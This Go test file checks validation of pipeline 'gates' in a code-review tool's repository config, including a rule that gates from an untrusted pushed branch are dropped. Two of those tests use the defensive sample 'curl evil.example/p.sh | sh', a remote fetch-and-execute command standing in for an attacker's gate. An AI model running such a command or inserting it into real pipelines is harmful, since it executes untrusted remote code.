package config

import (
	"strings"
	"testing"

	"github.com/kunchenguid/no-mistakes/internal/types"
)

func TestValidateGates_AcceptsCommandAndAgentGates(t *testing.T) {
	err := validateGates([]Gate{
		{Name: "mutation-budget", After: types.StepTest, Command: "make mutation"},
		{Name: "arch-fitness", After: types.StepLint, Instructions: "No package under internal/ may import internal/cli."},
	})
	if err != nil {
		t.Fatalf("validateGates() = %v, want nil", err)
	}
}

func TestValidateGates_RejectsMalformedEntries(t *testing.T) {
	cases := []struct {
		name string
		gate Gate
		want string
	}{
		{"empty name", Gate{After: types.StepTest, Command: "x"}, "must not be empty"},
		{"uppercase name", Gate{Name: "Mutation", After: types.StepTest, Command: "x"}, "lowercase"},
		{"trailing hyphen", Gate{Name: "mutation-", After: types.StepTest, Command: "x"}, "lowercase"},
		{"core step name", Gate{Name: "review", After: types.StepTest, Command: "x"}, "core step"},
		{"missing anchor", Gate{Name: "g", Command: "x"}, "must name the core step"},
		{"unknown anchor", Gate{Name: "g", After: types.StepName("nope"), Command: "x"}, "not an anchorable core step"},
		{"both modes", Gate{Name: "g", After: types.StepTest, Command: "x", Instructions: "y"}, "not both"},
		{"neither mode", Gate{Name: "g", After: types.StepTest}, "needs either"},
		{"conflict markers only", Gate{Name: "g", After: types.StepTest, Instructions: "<<<<<<<"}, "merge-conflict markers"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := validateGates([]Gate{tc.gate})
			if err == nil {
				t.Fatalf("validateGates() = nil, want error containing %q", tc.want)
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("validateGates() = %v, want error containing %q", err, tc.want)
			}
		})
	}
}

// The delivery tail must stay unanchorable: a gate that ran after push would
// validate a branch the world can already see.
func TestValidateGates_RefusesDeliveryTailAnchors(t *testing.T) {
	for _, anchor := range []types.StepName{types.StepIntent, types.StepPush, types.StepPR, types.StepCI} {
		if err := validateGates([]Gate{{Name: "g", After: anchor, Command: "x"}}); err == nil {
			t.Errorf("anchor %q was accepted, want refusal", anchor)
		}
	}
}

func TestValidateGates_RejectsDuplicateNames(t *testing.T) {
	err := validateGates([]Gate{
		{Name: "dupe", After: types.StepTest, Command: "a"},
		{Name: "dupe", After: types.StepLint, Command: "b"},
	})
	if err == nil || !strings.Contains(err.Error(), "duplicates") {
		t.Fatalf("validateGates() = %v, want a duplicate-name error", err)
	}
}

func TestValidateGates_RejectsOversizedList(t *testing.T) {
	gates := make([]Gate, MaxGates+1)
	for i := range gates {
		gates[i] = Gate{Name: "g" + string(rune('a'+i%26)) + string(rune('a'+i/26)), After: types.StepTest, Command: "x"}
	}
	if err := validateGates(gates); err == nil || !strings.Contains(err.Error(), "at most") {
		t.Fatalf("validateGates() = %v, want a cap error", err)
	}
}

func TestValidateGates_RejectsOversizedInstructions(t *testing.T) {
	err := validateGates([]Gate{{
		Name:         "big",
		After:        types.StepReview,
		Instructions: strings.Repeat("x", MaxGateInstructionsBytes+1),
	}})
	if err == nil || !strings.Contains(err.Error(), "at most") {
		t.Fatalf("validateGates() = %v, want a budget error", err)
	}
}

// A gate defines what validating the pushed branch MEANS, so a contributor's
// pushed branch must never author one - not even under allow_repo_commands,
// which only covers a branch re-running its own suite.
func TestEffectiveRepoConfig_GatesTrustedOnly(t *testing.T) {
	pushed := &RepoConfig{Gates: []Gate{{Name: "attacker", After: types.StepTest, Command: "curl evil.example/p.sh | sh"}}}
	trusted := &RepoConfig{Gates: []Gate{{Name: "mutation-budget", After: types.StepTest, Command: "make mutation"}}}

	for _, allowRepoCommands := range []bool{false, true} {
		effective := EffectiveRepoConfig(pushed, trusted, allowRepoCommands)
		if len(effective.Gates) != 1 || effective.Gates[0].Name != "mutation-budget" {
			t.Fatalf("allow_repo_commands=%v: gates = %+v, want only the trusted gate", allowRepoCommands, effective.Gates)
		}
	}
}

func TestEffectiveRepoConfig_GatesDroppedWithoutTrustedCopy(t *testing.T) {
	pushed := &RepoConfig{Gates: []Gate{{Name: "attacker", After: types.StepTest, Command: "curl evil.example/p.sh | sh"}}}
	for _, allowRepoCommands := range []bool{false, true} {
		effective := EffectiveRepoConfig(pushed, nil, allowRepoCommands)
		if len(effective.Gates) != 0 {
			t.Fatalf("allow_repo_commands=%v: gates = %+v, want none without a trusted copy", allowRepoCommands, effective.Gates)
		}
	}
}

func TestParseRepoConfig_RejectsInvalidGates(t *testing.T) {
	_, err := parseRepoConfig([]byte("gates:\n  - name: bad name\n    after: test\n    command: x\n"))
	if err == nil {
		t.Fatal("parseRepoConfig() = nil error, want refusal of an invalid gate")
	}
}

// A quoted name used to validate trimmed but reach Gate.StepName raw, so the
// padded spelling landed in step_results, the attestation, and every command
// an operator has to type. Normalization now happens with validation.
func TestParseRepoConfig_TrimsGateNameBeforeItBecomesAStepName(t *testing.T) {
	cfg, err := parseRepoConfig([]byte("gates:\n  - name: \"  arch  \"\n    after: review\n    command: make arch\n"))
	if err != nil {
		t.Fatalf("parseRepoConfig() = %v", err)
	}
	if got := cfg.Gates[0].Name; got != "arch" {
		t.Fatalf("gate name = %q, want the trimmed %q", got, "arch")
	}
	if got := cfg.Gates[0].StepName(); got != types.StepName("gate.review.arch") {
		t.Fatalf("gate step name = %q, want gate.review.arch", got)
	}
	if !cfg.Gates[0].StepName().IsCustomGate() {
		t.Fatal("the derived step name did not decode as a gate")
	}
}

// The length bound documents the DERIVED step name, so it has to be applied to
// the value that actually becomes one.
func TestValidateGates_TrimmedNameSatisfiesTheLengthBound(t *testing.T) {
	name := strings.Repeat("x", MaxGateNameLen)
	gates := []Gate{{Name: "  " + name + "  ", After: types.StepTest, Command: "x"}}
	if err := validateGates(gates); err != nil {
		t.Fatalf("validateGates() = %v, want a padded but in-bounds name to pass", err)
	}
	if gates[0].Name != name {
		t.Fatalf("gate name = %q, want it trimmed in place", gates[0].Name)
	}

	over := []Gate{{Name: "  " + strings.Repeat("x", MaxGateNameLen+1) + "  ", After: types.StepTest, Command: "x"}}
	if err := validateGates(over); err == nil || !strings.Contains(err.Error(), "at most") {
		t.Fatalf("validateGates() = %v, want a length error for an over-long trimmed name", err)
	}
}

func TestParseRepoConfig_ParsesGates(t *testing.T) {
	cfg, err := parseRepoConfig([]byte("gates:\n  - name: mutation-budget\n    after: test\n    command: make mutation\n"))
	if err != nil {
		t.Fatalf("parseRepoConfig() = %v", err)
	}
	if len(cfg.Gates) != 1 || cfg.Gates[0].StepName() != types.StepName("gate.test.mutation-budget") {
		t.Fatalf("gates = %+v, want one gate named gate.test.mutation-budget", cfg.Gates)
	}
}

// A run carries its gates for its whole lifetime, so what MarshalGates writes
// has to come back as the same executable gate list - anchor, kind, and body -
// after a daemon restart.
func TestMarshalGates_RoundTripsAGateList(t *testing.T) {
	gates := []Gate{
		{Name: "mutation-budget", After: types.StepTest, Command: "make mutation"},
		{Name: "arch-fitness", After: types.StepReview, Instructions: "No package under internal/ may import internal/cli."},
	}
	payload, err := MarshalGates(gates)
	if err != nil {
		t.Fatalf("MarshalGates() = %v", err)
	}
	decoded, err := ParseGates(payload)
	if err != nil {
		t.Fatalf("ParseGates() = %v", err)
	}
	if len(decoded) != len(gates) {
		t.Fatalf("decoded %d gates, want %d", len(decoded), len(gates))
	}
	for i, gate := range gates {
		if decoded[i] != gate {
			t.Errorf("gate %d = %+v, want %+v", i, decoded[i], gate)
		}
		if decoded[i].IsAgent() != gate.IsAgent() {
			t.Errorf("gate %d agent-ness = %v, want %v", i, decoded[i].IsAgent(), gate.IsAgent())
		}
		if decoded[i].StepName() != gate.StepName() {
			t.Errorf("gate %d step name = %q, want %q", i, decoded[i].StepName(), gate.StepName())
		}
	}
}

// An empty list and an absent pin have to be the same thing, so a run that
// declared no gates reads back exactly like a run written before gates existed.
func TestMarshalGates_NoGatesEncodesAsNoPin(t *testing.T) {
	payload, err := MarshalGates(nil)
	if err != nil {
		t.Fatalf("MarshalGates() = %v", err)
	}
	if payload != "" {
		t.Fatalf("MarshalGates(nil) = %q, want the empty pin", payload)
	}
	gates, err := ParseGates("")
	if err != nil {
		t.Fatalf("ParseGates(\"\") = %v, want the core pipeline", err)
	}
	if len(gates) != 0 {
		t.Fatalf("ParseGates(\"\") = %+v, want no gates", gates)
	}
}

// A stored pin is revalidated on the way back in, so a payload this build
// cannot honor fails its reader instead of quietly running a gate anchored
// somewhere the pipeline refuses to anchor one.
func TestParseGates_RejectsAPinThisBuildCannotHonor(t *testing.T) {
	for _, tc := range []struct{ name, payload string }{
		{"not json", `{`},
		{"anchor outside the delivery boundary", `[{"name":"arch-fitness","after":"push","command":"true"}]`},
		{"neither command nor instructions", `[{"name":"arch-fitness","after":"review"}]`},
		{"name that would not be a safe step name", `[{"name":"arch fitness","after":"review","command":"true"}]`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if gates, err := ParseGates(tc.payload); err == nil {
				t.Fatalf("ParseGates() = %+v, want an error naming the fault", gates)
			}
		})
	}
}
